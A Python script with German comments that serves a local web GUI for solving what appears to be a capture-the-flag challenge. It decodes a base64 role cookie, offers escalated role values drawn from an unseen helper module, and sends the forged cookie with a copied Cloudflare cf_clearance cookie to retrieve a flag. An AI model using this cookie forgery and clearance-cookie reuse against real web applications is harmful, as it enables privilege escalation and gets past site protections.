#!/usr/bin/env python3
# recon_gui_autumn.py — recon_gui mit sichtbarer Pipeline + Herbst-Pixel-Skin.
#
# Gleiche Logik wie recon_gui.py, aber: die 5 Stufen (Cookie -> Dekodieren ->
# Hebel -> Abschicken -> Flag) sind als Pixel-Kacheln sichtbar und leuchten auf,
# waehrend du durchgehst. Fallende Herbstblaetter im Hintergrund.
#
# Braucht recon.py im selben Ordner.  Start: python3 recon_gui_autumn.py

import re, html, json, webbrowser, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import requests
from recon import classify

DEFAULT_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/157.0.0.0 Safari/537.36")
DEFAULT_URL = "https://pointeuse.cyberzerk.fr/"
DEFAULT_COOKIE = "profil"
DEFAULT_RAW = "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"
FLAG_RE = r"CyberZerk\{.*?\}"
PORT = 8777


def fire(url, cf, ua, cookie_name, forged):
    try:
        r = requests.get(url, headers={"User-Agent": ua},
                         cookies={"cf_clearance": cf, cookie_name: forged},
                         timeout=20)
    except Exception as e:
        return None, None, f"Request fehlgeschlagen: {e}"
    m = re.search(FLAG_RE, r.text)
    return r.status_code, (m.group() if m else None), None


# ---------- Pixel-Icons (8x8 Sprites) ----------
ICON_PATTERNS = {
    "cookie": ".######.\n########\n##o###o#\n########\n#o####o#\n###o####\n########\n.######.",
    "decode": ".####...\n#....#..\n#.##.#..\n#....#..\n.####.#.\n....###.\n.....##.\n......#.",
    "hebel":  "...#....\n..###...\n.#####..\n#######.\n...#....\n...#....\n...##...\n...#....",
    "feuer":  "...#....\n..###...\n.#####..\n#######.\n.#####..\n..###...\n...#....\n...#....",
    "flag":   "#.......\n#####o..\n#oooo#..\n#ooo#o..\n#oo#....\n#.......\n#.......\n#.......",
}


def render_icon(key):
    lines = ICON_PATTERNS[key].split("\n")
    r = []
    for y, row in enumerate(lines):
        for x, ch in enumerate(row):
            if ch == "#":
                r.append(f'<rect x="{x}" y="{y}" width="1" height="1" fill="currentColor"/>')
            elif ch == "o":
                r.append(f'<rect x="{x}" y="{y}" width="1" height="1" fill="#000" fill-opacity=".35"/>')
    w = max(len(l) for l in lines)
    return (f'<svg class="ico" viewBox="0 0 {w} {len(lines)}" '
            f'shape-rendering="crispEdges">{"".join(r)}</svg>')


STAGES = [("cookie", "Cookie"), ("decode", "Dekodieren"),
          ("hebel", "Hebel"), ("feuer", "Abschicken"), ("flag", "Flag")]

# Zustand der 5 Kacheln je Phase: d=done, a=active, p=pending, e=error
PHASE = {
    "input":       "appp p".replace(" ", ""),
    "recon_ok":    "dddap",
    "recon_nomut": "ddepp",
    "flag":        "ddddd",
    "fail":        "dddep",
}


def flow_html(phase):
    states = PHASE[phase]
    cls = {"d": "done", "a": "active", "p": "pending", "e": "error"}
    tiles = []
    for i, (key, label) in enumerate(STAGES):
        tiles.append(
            f'<div class="tile {cls[states[i]]}"><div class="tbox">'
            f'{render_icon(key)}</div><div class="tlabel">{label}</div></div>')
        if i < len(STAGES) - 1:
            tiles.append('<div class="conn"></div>')
    return f'<div class="flow">{"".join(tiles)}</div>'


# ---------- Stil ----------
CSS = """@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
:root{color-scheme:dark;--bg:#1a120b;--panel:#2a1d12;--edge:#120b06;
--pump:#e8743b;--gold:#e0a92e;--moss:#7a8b3c;--rust:#9c3b1b;--cream:#f2e3c8;--dim:#6b5844}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;background:radial-gradient(130% 90% at 50% 0,#3a2411 0,#1a120b 60%);
color:var(--cream);font:14px/1.6 ui-monospace,Menlo,monospace;
display:flex;justify-content:center;padding:28px 16px;position:relative;overflow-x:hidden}
#leaves{position:fixed;inset:0;z-index:0;pointer-events:none}
.wrap{width:100%;max-width:700px;position:relative;z-index:1}
.px{font-family:'Press Start 2P',monospace;line-height:1.5}
h1{font-size:19px;margin:0 0 6px;color:var(--gold);text-shadow:2px 2px 0 var(--edge)}
.sub{color:#c7a98a;font-size:12px;margin:0 0 22px}
/* Pipeline */
.flow{display:flex;align-items:flex-start;gap:0;justify-content:space-between;
background:var(--panel);border:3px solid var(--edge);box-shadow:6px 6px 0 var(--edge);
padding:16px 12px;margin-bottom:26px}
.tile{display:flex;flex-direction:column;align-items:center;gap:7px;width:68px;text-align:center}
.tbox{width:48px;height:48px;display:flex;align-items:center;justify-content:center;
border:3px solid var(--edge);background:#1d140c}
.ico{width:30px;height:30px;image-rendering:pixelated}
.tlabel{font-family:'Press Start 2P',monospace;font-size:7px;line-height:1.4;color:var(--dim)}
.conn{flex:1;height:4px;margin-top:22px;background:var(--dim);image-rendering:pixelated}
.tile.pending .tbox{color:var(--dim)}
.tile.active .tbox{color:var(--pump);border-color:var(--pump);
box-shadow:0 0 0 3px #4a2a14;animation:pulse 1s steps(2) infinite}
.tile.active .tlabel{color:var(--pump)}
.tile.done .tbox{color:var(--gold);border-color:var(--gold);background:#2a1f0d}
.tile.done .tlabel{color:var(--gold)}
.tile.error .tbox{color:#ff6b57;border-color:var(--rust)}
.tile.error .tlabel{color:#ff6b57}
@keyframes pulse{50%{opacity:.55}}
/* Panels + Form */
label{display:block;font-family:'Press Start 2P',monospace;font-size:9px;
color:var(--gold);margin:18px 0 6px}
.hint{color:#b89a7c;font-size:12px;margin:2px 0 7px}
input,select,textarea{width:100%;background:#1d140c;border:3px solid var(--edge);
color:var(--cream);padding:10px 12px;font:13px ui-monospace,Menlo,monospace}
input:focus,select:focus,textarea:focus{outline:none;border-color:var(--gold)}
button{margin-top:20px;font-family:'Press Start 2P',monospace;font-size:11px;
background:var(--pump);color:#1a120b;border:3px solid var(--edge);
box-shadow:4px 4px 0 var(--edge);padding:12px 18px;cursor:pointer}
button:hover{background:var(--gold)}
button:active{transform:translate(4px,4px);box-shadow:0 0 0 var(--edge)}
.box{margin-top:22px;background:var(--panel);border:3px solid var(--edge);
box-shadow:6px 6px 0 var(--edge);padding:16px}
.badge{display:inline-block;background:var(--moss);color:#14110a;font-size:10px;
font-weight:700;padding:3px 9px;margin-left:8px;border:2px solid var(--edge)}
.k{color:#b89a7c;font-size:11px;margin-top:12px;text-transform:uppercase;letter-spacing:1px}
.v{word-break:break-all}
.lever{border-left:5px solid var(--gold);padding:6px 0 6px 11px;margin:12px 0;background:#201609}
.lever.id{border-color:var(--dim)}
.flag{font-family:'Press Start 2P',monospace;font-size:14px;line-height:1.7;
color:var(--moss);word-break:break-all;text-shadow:2px 2px 0 var(--edge)}
.fail{color:#ff6b57;font-weight:700}"""

LEAVES_JS = """
const c=document.getElementById('leaves'),x=c.getContext('2d');
let W,H;function rs(){W=c.width=innerWidth;H=c.height=innerHeight;}rs();addEventListener('resize',rs);
const PAT=[[0,0,1,0,1,0,0],[1,0,1,1,1,0,1],[1,1,1,1,1,1,1],[0,1,1,1,1,1,0],[0,0,1,1,1,0,0],[0,0,0,1,0,0,0],[0,0,0,1,0,0,0]];
const COL=['#e8743b','#e0a92e','#9c3b1b','#c86a2a','#b5862b','#7a8b3c'];
function mk(){return {x:Math.random()*W,y:-20-Math.random()*H,px:2+Math.random()*2|0,
sp:.3+Math.random()*.7,ph:Math.random()*6.28,sw:14+Math.random()*22,col:COL[Math.random()*COL.length|0]};}
let L=[];for(let i=0;i<22;i++)L.push(mk());
function draw(t){x.clearRect(0,0,W,H);for(const l of L){l.y+=l.sp;l.x+=Math.sin(t/900+l.ph)*.4;
const ox=l.x+Math.sin(t/700+l.ph)*l.sw;x.globalAlpha=.85;x.fillStyle=l.col;
for(let r=0;r<7;r++)for(let cc=0;cc<7;cc++)if(PAT[r][cc])x.fillRect(ox+cc*l.px|0,l.y+r*l.px|0,l.px,l.px);
if(l.y>H+20){Object.assign(l,mk());l.y=-20;}}requestAnimationFrame(draw);}requestAnimationFrame(draw);
"""


def esc(s):
    return html.escape(str(s))


def page(url, cf, ua, cname, raw, phase="input", body=""):
    return f"""<!doctype html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Recon Solver</title><style>{CSS}</style></head>
<body><canvas id="leaves"></canvas><div class="wrap">
<h1 class="px">RECON SOLVER</h1>
<p class="sub">Herbst-Edition · dekodiert live, zeigt die Hebel, du feuerst ab.
Laeuft lokal &rarr; Request geht von deiner IP.</p>
{flow_html(phase)}
<form method="post" action="/recon">
  <label>Ziel-URL</label><input name="url" value="{esc(url)}">
  <label>cf_clearance</label>
  <div class="hint">DevTools &rarr; Application &rarr; Cookies &rarr; pointeuse.cyberzerk.fr.
  Laeuft ab &mdash; frisch holen.</div>
  <input name="cf" value="{esc(cf)}" placeholder="cf_clearance...">
  <label>User-Agent</label><input name="ua" value="{esc(ua)}">
  <label>Cookie-Name</label><input name="cname" value="{esc(cname)}">
  <label>Cookie-Wert (roh)</label>
  <div class="hint">Wert aus dem Cookie-Panel. Recon dekodiert ihn selbst.</div>
  <textarea name="raw" style="min-height:54px;resize:vertical">{esc(raw)}</textarea>
  <button type="submit">Recon starten</button>
</form>
{body}
</div><script>{LEAVES_JS}</script></body></html>"""


def render_findings(f, url, cf, ua, cname, raw, result=""):
    parts = [f'<div class="box"><b>Befund: Cookie \'{esc(f["cookie"])}\'</b>'
             f'<span class="badge">{esc(f["encoding"])}</span>']
    if f["json"] is not None:
        parts.append(f'<div class="k">Dekodierter Inhalt</div>'
                     f'<div class="v">{esc(json.dumps(f["json"], ensure_ascii=False))}</div>')
    options, has_mut = [], False
    for lv in f["levers"]:
        if lv["typ"] == "identitaet":
            parts.append(f'<div class="lever id"><b>IDENTITAET</b> · '
                         f'{esc(lv["key"])}={esc(lv["aktuell"])}<br>'
                         f'<span class="hint">{esc(lv["hinweis"])}</span></div>')
        else:
            parts.append(f'<div class="lever"><b>ROLLE</b> · '
                         f'{esc(lv["key"])}={esc(lv["aktuell"])} · '
                         f'{len(lv["mutationen"])} Eskalationen vorbereitet</div>')
            for m in lv["mutationen"]:
                if m["cookie_value"]:
                    has_mut = True
                    options.append(f'<option value="{esc(m["cookie_value"])}">'
                                   f'{esc(m["set"])}</option>')
    if has_mut:
        parts.append(
            '<form method="post" action="/fire">'
            f'<input type="hidden" name="url" value="{esc(url)}">'
            f'<input type="hidden" name="cf" value="{esc(cf)}">'
            f'<input type="hidden" name="ua" value="{esc(ua)}">'
            f'<input type="hidden" name="cname" value="{esc(cname)}">'
            f'<input type="hidden" name="raw" value="{esc(raw)}">'
            '<label>Mutation waehlen &amp; abschicken</label>'
            '<div class="hint">Welche gewinnt? Das weiss Recon nicht &mdash; '
            'genau hier kaeme der LLM-Schritt.</div>'
            f'<select name="forged">{"".join(options)}</select>'
            '<button type="submit">Abschicken</button></form>')
    else:
        parts.append('<div class="hint">Keine fertige Mutation (JWT braucht '
                     'Signatur, oder kein Rollen-Hebel).</div>')
    parts.append(result + '</div>')
    return "".join(parts), has_mut


def render_result(status, flag, error):
    if error:
        body = f'<div class="fail">{esc(error)}</div>'
    elif flag:
        body = f'<div class="flag">{esc(flag)}</div>'
    else:
        body = ('<div class="fail">Kein Flag.</div><div class="hint">cf_clearance '
                'abgelaufen, UA stimmt nicht, oder falsche Mutation.</div>')
    s = f'<div class="k">HTTP Status</div><div class="v">{esc(status)}</div>' if status else ""
    return f'<div class="box">{body}{s}</div>'


class Handler(BaseHTTPRequestHandler):
    def _send(self, b):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b.encode())

    def log_message(self, *a):
        pass

    def _form(self):
        n = int(self.headers.get("Content-Length", 0))
        d = parse_qs(self.rfile.read(n).decode())
        return lambda k, dv="": d.get(k, [dv])[0]

    def do_GET(self):
        self._send(page(DEFAULT_URL, "", DEFAULT_UA, DEFAULT_COOKIE, DEFAULT_RAW, "input"))

    def do_POST(self):
        g = self._form()
        url, cf, ua = g("url", DEFAULT_URL), g("cf"), g("ua", DEFAULT_UA)
        cname, raw = g("cname", DEFAULT_COOKIE), g("raw")
        f = classify(cname, raw)
        if self.path == "/fire":
            status, flag, error = fire(url, cf, ua, cname, g("forged"))
            body, _ = render_findings(f, url, cf, ua, cname, raw,
                                      render_result(status, flag, error))
            phase = "flag" if flag else "fail"
        else:
            body, has_mut = render_findings(f, url, cf, ua, cname, raw)
            phase = "recon_ok" if has_mut else "recon_nomut"
        self._send(page(url, cf, ua, cname, raw, phase, body))


if __name__ == "__main__":
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    u = f"http://127.0.0.1:{PORT}"
    print(f"Recon Solver (Herbst) laeuft:  {u}   (Strg+C zum Beenden)")
    threading.Timer(0.6, lambda: webbrowser.open(u)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBeendet.")
